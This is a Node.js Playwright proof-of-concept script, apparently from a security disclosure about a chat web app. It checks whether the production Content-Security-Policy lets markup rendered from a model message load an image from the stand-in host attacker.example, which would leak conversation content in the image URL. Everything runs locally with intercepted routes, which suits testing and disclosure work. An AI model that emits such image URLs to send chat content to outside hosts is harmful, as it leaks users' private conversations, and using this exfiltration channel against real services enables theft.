// PoC B (part 2): the production chat CSP lets the markup that React produced
// for a model message (poc/out/rendered-message.html, written by
// tests/poc/model-output-remote-image.test.tsx) fetch the attacker's URL the
// moment it is in the document. No click, no sandbox, the verified origin
// itself makes the request.
//
// LOCAL ONLY: https://chat.tinfoil.sh/ and https://attacker.example/ are both
// served by Playwright route interception; DNS is disabled for every host.
import { chromium } from 'playwright'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const WEBAPP_REPO = path.resolve(HERE, '../tinfoil-webapp')
const OUT = path.join(HERE, 'out')
const chatVercel = JSON.parse(fs.readFileSync(path.join(WEBAPP_REPO, 'vercel.json'), 'utf8'))
const CHAT_HEADERS = Object.fromEntries(chatVercel.headers[0].headers.map((h) => [h.key.toLowerCase(), h.value]))
const CHAT_CSP = CHAT_HEADERS['content-security-policy']

const renderedMessage = fs.readFileSync(path.join(OUT, 'rendered-message.html'), 'utf8')
const renderedWidget = fs.readFileSync(path.join(OUT, 'rendered-render-image-widget.html'), 'utf8')
const PNG_1x1 = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64')

const browser = await chromium.launch({ args: ['--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE localhost'] })
const page = await browser.newPage()
const attackerLog = []
const cspViolations = []
page.on('console', (m) => { if (/Content.Security.Policy|Refused to/.test(m.text())) cspViolations.push(m.text().slice(0, 160)) })
await page.route('**/*', (route) => {
  const req = route.request()
  const url = new URL(req.url())
  if (url.origin === 'https://chat.tinfoil.sh') {
    const body = `<!doctype html><html><head><meta charset="utf-8"></head><body>
      <main id="assistant-message">${renderedMessage}</main>
      <section id="render-image-widget">${renderedWidget}</section>
    </body></html>`
    return route.fulfill({ status: 200, headers: { ...CHAT_HEADERS, 'content-type': 'text/html; charset=utf-8' }, body })
  }
  if (url.origin === 'https://attacker.example') {
    attackerLog.push({ url: req.url(), resourceType: req.resourceType(), frame: req.frame().url(), referer: req.headers()['referer'] ?? null })
    return route.fulfill({ status: 200, headers: { 'content-type': 'image/png' }, body: PNG_1x1 })
  }
  attackerLog.push({ url: req.url(), UNEXPECTED: true })
  return route.abort('blockedbyclient')
})

await page.goto('https://chat.tinfoil.sh/')
// Lazy-loaded widget images only load when near the viewport; scroll once.
await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight))
await page.waitForTimeout(1500)
const imgs = await page.evaluate(() => [...document.querySelectorAll('img')].map((i) => ({ src: i.getAttribute('src'), complete: i.complete, naturalWidth: i.naturalWidth })))
await browser.close()

console.log('chat CSP:', CHAT_CSP)
console.log('images in the document:', JSON.stringify(imgs, null, 2))
console.log('requests that reached attacker.example:')
for (const e of attackerLog) console.log('   ', e.UNEXPECTED ? 'UNEXPECTED ' + e.url : `${e.resourceType} ${e.url} (frame=${e.frame}, referer=${e.referer})`)
for (const v of cspViolations) console.log('    csp:', v)
const leaked = attackerLog.filter((e) => !e.UNEXPECTED && e.url.includes('CONFIDENTIAL_CHAT_CONTENT'))
console.log(leaked.length ? `\nLEAK: ${leaked.length} request(s) carrying the chat content reached the attacker from the chat origin` : '\nno leak')
fs.writeFileSync(path.join(OUT, 'chat-image-exfil-results.json'), JSON.stringify({ chatCsp: CHAT_CSP, images: imgs, attackerLog, cspViolations }, null, 2))
